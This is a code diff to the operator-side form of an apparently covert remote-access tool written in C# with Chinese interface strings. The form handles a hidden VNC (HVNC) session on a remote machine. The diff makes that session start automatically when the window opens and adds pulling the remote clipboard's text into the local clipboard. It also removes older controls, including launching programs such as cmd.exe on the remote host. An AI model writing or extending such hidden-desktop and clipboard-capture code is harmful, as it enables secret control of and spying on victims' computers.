@@ -1,10 +1,9 @@
 using System;
-using System.Collections.Generic;
 using System.Drawing;
-using System.Drawing.Imaging;
-using System.IO;
 using System.Windows.Forms;
 using RemoteControl.Protocals;
+using RemoteControl.Protocals.Request;
+using RemoteControl.Protocals.Response;
 using log4net;
 
 namespace RemoteControl.Server
@@ -21,9 +20,29 @@ namespace RemoteControl.Server
         {
             InitializeComponent();
             this.oSession = session;
+            this.Load += FrmHVNC_Load;
         }
 
-        #region Screen display
+        private void FrmHVNC_Load(object sender, EventArgs e)
+        {
+            // 窗口打开时自动启动HVNC
+            AutoStartHVNC();
+        }
+
+        private void AutoStartHVNC()
+        {
+            if (oSession != null)
+            {
+                RequestHVNCStart req = new RequestHVNCStart();
+                req.Fps = _currentFps;
+                oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
+                toolStripButtonStart.Enabled = false;
+                toolStripButtonStop.Enabled = true;
+                toolStripLabelStatus.Text = "正在启动HVNC...";
+            }
+        }
+
+        #region Response handlers
 
         public void HandleScreen(ResponseHVNCScreen resp)
         {
@@ -36,7 +55,10 @@ namespace RemoteControl.Server
             }
             try
             {
+                Image oldImage = this.pictureBox1.Image;
                 this.pictureBox1.Image = resp.GetImage();
+                if (oldImage != null)
+                    oldImage.Dispose();
             }
             catch (Exception ex)
             {
@@ -66,85 +88,25 @@ namespace RemoteControl.Server
             }
         }
 
-        #endregion
-
-        #region Toolbar events
-
-        private void toolStripButtonStart_Click(object sender, EventArgs e)
+        public void HandleClipboardResponse(ResponseClipboardGet resp)
         {
-            RequestHVNCStart req = new RequestHVNCStart();
-            req.Fps = _currentFps;
-            oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
-            toolStripButtonStart.Enabled = false;
-            toolStripButtonStop.Enabled = true;
-        }
-
-        private void toolStripButtonStop_Click(object sender, EventArgs e)
-        {
-            oSession.Send(ePacketType.PACKET_HVNC_STOP_REQUEST, null);
-            toolStripButtonStart.Enabled = true;
-            toolStripButtonStop.Enabled = false;
-        }
-
-        private void toolStripButtonRunProcess_Click(object sender, EventArgs e)
-        {
-            var dlg = new FrmInputUrl();
-            dlg.Text = "启动程序 - 输入程序路径(cmd.exe)";
-            dlg.ShowDialog();
-            string input = dlg.InputText;
-            if (!string.IsNullOrEmpty(input))
+            if (resp == null) return;
+            if (this.InvokeRequired)
             {
-                RequestHVNCRunProcess req = new RequestHVNCRunProcess();
-                string[] parts = input.Split(new char[] { ' ' }, 2);
-                req.FilePath = parts[0];
-                req.Arguments = parts.Length > 1 ? parts[1] : "";
-                oSession.Send(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, req);
+                this.Invoke(new Action<ResponseClipboardGet>(HandleClipboardResponse), resp);
+                return;
+            }
+            if (resp.Result && !string.IsNullOrEmpty(resp.Text))
+            {
+                Clipboard.SetText(resp.Text);
+                this.toolStripLabelStatus.Text = "剪贴板已复制到本地";
+            }
+            else
+            {
+                this.toolStripLabelStatus.Text = "远程剪贴板为空";
             }
         }
 
-        private void toolStripSplitButtonCapture_ButtonClick(object sender, EventArgs e)
-        {
-            toolStripSplitButtonCapture.ShowDropDown();
-        }
-
-        private void toolStripMenuItemCaptureMouse_Click(object sender, EventArgs e)
-        {
-            toolStripMenuItemCaptureMouse.Checked = !toolStripMenuItemCaptureMouse.Checked;
-            _isCaptureMouse = toolStripMenuItemCaptureMouse.Checked;
-        }
-
-        private void toolStripMenuItemCaptureKeyboard_Click(object sender, EventArgs e)
-        {
-            toolStripMenuItemCaptureKeyboard.Checked = !toolStripMenuItemCaptureKeyboard.Checked;
-            _isCaptureKeyboard = toolStripMenuItemCaptureKeyboard.Checked;
-        }
-
-        private void toolStripSplitButtonFPS_ButtonClick(object sender, EventArgs e)
-        {
-            toolStripSplitButtonFPS.ShowDropDown();
-        }
-
-        private void toolStripMenuItemFPS_Click(object sender, EventArgs e)
-        {
-            ToolStripMenuItem item = sender as ToolStripMenuItem;
-            if (item == null || item.Tag == null) return;
-
-            // Uncheck all
-            foreach (ToolStripItem child in toolStripSplitButtonFPS.DropDownItems)
-            {
-                var mi = child as ToolStripMenuItem;
-                if (mi != null) mi.Checked = false;
-            }
-            item.Checked = true;
-            _currentFps = Convert.ToInt32(item.Tag);
-
-            // Send updated fps
-            RequestHVNCStart req = new RequestHVNCStart();
-            req.Fps = _currentFps;
-            oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
-        }
-
         #endregion
-
     }
 }
